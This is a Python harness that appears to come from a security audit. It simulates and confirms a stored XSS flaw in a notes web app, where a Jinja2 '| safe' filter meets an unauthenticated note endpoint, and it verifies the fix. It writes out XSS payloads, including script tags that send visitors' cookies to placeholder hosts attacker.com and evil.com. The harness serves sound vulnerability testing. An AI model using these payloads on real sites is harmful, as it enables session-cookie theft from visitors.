#!/usr/bin/env python3
"""Harness: Verify stored XSS via Jinja2 | safe filter in notes.html:18.

Simulates the source→sink chain:
  1. POST /api/notes (no auth) → create_note() → SQLite INSERT (body stored verbatim)
  2. GET /notes → render_template("notes.html") → {{ n.body | safe }} (unescaped output)

Confirms that | safe disables Jinja2 auto-escaping, allowing raw <script> tags
to appear in the rendered HTML. Also verifies the fix (removing | safe) escapes them.
"""
import sqlite3
import html
import re


def create_note(conn, *, author, title, body):
    """Mirrors src/board/store.py create_note (parameterized INSERT)."""
    cur = conn.execute(
        "INSERT INTO notes(author, title, body) VALUES (?, ?, ?)",
        (author, title, body),
    )
    conn.commit()
    return int(cur.lastrowid)


def list_notes(conn):
    """Mirrors src/board/store.py list_notes."""
    rows = conn.execute(
        "SELECT id, author, title, body FROM notes ORDER BY id DESC"
    ).fetchall()
    return [dict(r) for r in rows]


def render_notes(notes, use_safe=True):
    """Simulate Jinja2 rendering of notes.html.

    use_safe=True  → mirrors {{ n.body | safe }} (line 18, vulnerable)
    use_safe=False → mirrors {{ n.body }} (the fix, auto-escaped)
    """
    parts = ['<!doctype html><html><body>']
    for n in notes:
        body_content = n['body'] if use_safe else html.escape(n['body'])
        parts.append(
            f'<article><h2>{html.escape(n["title"])}</h2>'
            f'<p class="meta">#{n["id"]} · {html.escape(n["author"])}</p>'
            f'<div class="body">{body_content}</div></article>'
        )
    parts.append('</body></html>')
    return ''.join(parts)


def main():
    # Setup in-memory SQLite (mirrors engine.py init_db)
    conn = sqlite3.connect(":memory:")
    conn.row_factory = sqlite3.Row
    conn.execute("CREATE TABLE notes (id INTEGER PRIMARY KEY, author TEXT, title TEXT, body TEXT)")

    # Step 1: Attacker creates note with XSS payload (no auth required)
    xss_payload = '<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>'
    note_id = create_note(conn, author="attacker", title="xss-test", body=xss_payload)
    print(f"[+] Note created (id={note_id}) with XSS payload (no auth required)")

    # Add a benign note to simulate real data
    create_note(conn, author="alice", title="welcome", body="Ship the Q3 memo.")

    # Step 2: Render /notes page (mirrors GET /notes -> render_template)
    notes = list_notes(conn)
    html_vulnerable = render_notes(notes, use_safe=True)

    print(f"\n--- Rendered HTML (with | safe - VULNERABLE) ---")
    print(html_vulnerable)

    # Step 3: Verify XSS payload is unescaped
    if xss_payload in html_vulnerable:
        print("\n[+] CONFIRMED: XSS payload rendered UNESCAPED in /notes page")
        print(f"[+] Raw <script> tag present in HTML output")
        print(f"[+] Any visitor's browser will execute the injected script")
    else:
        print("\n[-] XSS payload was escaped (not vulnerable)")
        return 1

    # Step 4: Verify the fix (without | safe) escapes the payload
    html_fixed = render_notes(notes, use_safe=False)
    if xss_payload not in html_fixed:
        print(f"\n[+] Fix verified: without | safe, payload is HTML-escaped (no XSS)")
        match = re.search(r'<div class="body">.*?</div>', html_fixed, re.DOTALL)
        if match:
            print(f"    Escaped output: {match.group()}")
    else:
        print("\n[-] Even without | safe, payload is unescaped (unexpected)")
        return 1

    # Step 5: Verify multiple XSS payloads
    print("\n--- Testing multiple XSS payloads ---")
    payloads = [
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(document.cookie)>',
        '<script>document.location="https://evil.com/?c="+document.cookie</script>',
    ]
    all_pass = True
    for p in payloads:
        create_note(conn, author="attacker", title="test", body=p)
        notes = list_notes(conn)
        html_out = render_notes(notes, use_safe=True)
        if p in html_out:
            print(f"  [+] Payload unescaped: {p[:60]}...")
        else:
            print(f"  [-] Payload escaped: {p[:60]}...")
            all_pass = False

    if not all_pass:
        return 1

    print("\n=== CONCLUSION ===")
    print("Source: POST /api/notes body= (no auth) -> create_note() -> SQLite INSERT")
    print("Sink: notes.html:18 {{ n.body | safe }} -> raw HTML output to /notes page")
    print("The | safe filter disables Jinja2 auto-escaping for n.body.")
    print("POST /api/notes has no auth, so any anonymous attacker can store XSS payloads.")
    print("GET /notes is public, so the payload executes in every visitor's browser.")
    print("Confirmed stored XSS vulnerability.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
